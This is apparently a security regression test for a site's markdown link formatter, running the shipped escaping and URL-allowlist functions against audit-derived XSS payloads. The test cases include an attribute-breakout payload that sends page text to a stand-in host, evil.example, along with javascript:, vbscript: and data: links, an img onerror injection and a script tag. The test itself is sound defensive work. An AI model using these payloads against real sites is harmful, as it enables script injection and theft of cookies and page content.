/* Runs the SHIPPED esc/safeUrl/fmt against the audit's payloads. No re-implementation.
 * The assertions are structural, not string-matching on escaped text:
 *   1. every href value is an absolute http(s) URL   (scheme allowlist holds)
 *   2. the only raw < > in the output open tags fmt itself emits  (no markup injection)
 *   3. the only raw " in the output are fmt's own attribute delimiters (no breakout)
 */
import { readFileSync } from 'fs';
const src = readFileSync(new URL('../site/app.js', import.meta.url), 'utf8');
const grab = n => {
  const i = src.indexOf('function ' + n + '(');
  let d = 0, j = src.indexOf('{', i);
  for (let k = j; k < src.length; k++) {
    if (src[k] === '{') d++;
    else if (src[k] === '}') { d--; if (!d) { j = k; break; } }
  }
  return src.slice(i, j + 1);
};
const { fmt } = new Function(grab('esc') + grab('safeUrl') + grab('fmt') + 'return {fmt};')();

const ALLOWED_TAG = /^<\/?(p|a|sup|strong|em)(\s|>|$)/;

function check(out) {
  const problems = [];
  for (const m of out.matchAll(/href="([^"]*)"/g)) {
    if (!/^https?:\/\//.test(m[1])) problems.push(`href scheme not http(s): ${m[1].slice(0, 60)}`);
  }
  // every raw '<' must begin a tag fmt is allowed to emit
  for (const m of out.matchAll(/</g)) {
    const tag = out.slice(m.index);
    if (!ALLOWED_TAG.test(tag)) problems.push(`unexpected raw tag: ${tag.slice(0, 40)}`);
  }
  // fmt emits exactly 4 raw quotes per anchor (href, target, rel pairs = 6); any odd
  // structure means a value was closed early
  const opens = (out.match(/="/g) || []).length;
  const closes = (out.match(/"[ >]/g) || []).length;
  if (opens !== closes) problems.push(`unbalanced attribute quotes: ${opens} open / ${closes} close`);
  return problems;
}

const cases = [
  ['auditor payload (attribute breakout)',
   'See [source](https://nature.test/a"/autofocus/onfocus=location.href=\'https://evil.example/?d=\'+document.body.innerText//)'],
  ['javascript: scheme', 'Click [here](javascript:alert(document.cookie))'],
  ['data:text/html scheme', 'Open [this](data:text/html,hello)'],
  ['vbscript: scheme', 'Go [there](vbscript:msgbox(1))'],
  ['single-quote breakout', "A [x](https://a.test/b'onmouseover='alert(1))"],
  ['raw html in prose', '<img src=x onerror=alert(1)> plus <script>alert(2)</script>'],
  ['bracket citation form', 'Yes.[[1]](javascript:alert(1))'],
  ['paren citation form', 'Yes. ([evil.test](javascript:alert(1)))'],
  ['protocol-relative', 'See [x](//evil.example/a)'],
  ['legit https citation survives', 'Per [apnews.com](https://apnews.com/a?x=1&y=2) it holds.'],
];

let bad = 0;
for (const [name, input] of cases) {
  const out = fmt(input);
  const problems = check(out);
  if (problems.length) bad++;
  console.log(`${problems.length ? 'FAIL' : 'PASS'}  ${name}`);
  if (problems.length) problems.forEach(p => console.log(`        ${p}`));
}
// the legitimate link must still work, and its & must not be double-encoded
const legit = fmt('Per [apnews.com](https://apnews.com/a?x=1&y=2) it holds.');
if (!/href="https:\/\/apnews\.com\/a\?x=1&amp;y=2"/.test(legit)) {
  console.log('FAIL  legitimate URL mangled:', legit); bad++;
} else console.log('PASS  legitimate & encoded exactly once');

console.log(bad === 0 ? '\nAll payloads neutralised.' : `\n${bad} STILL EXPLOITABLE`);
process.exit(bad ? 1 : 0);
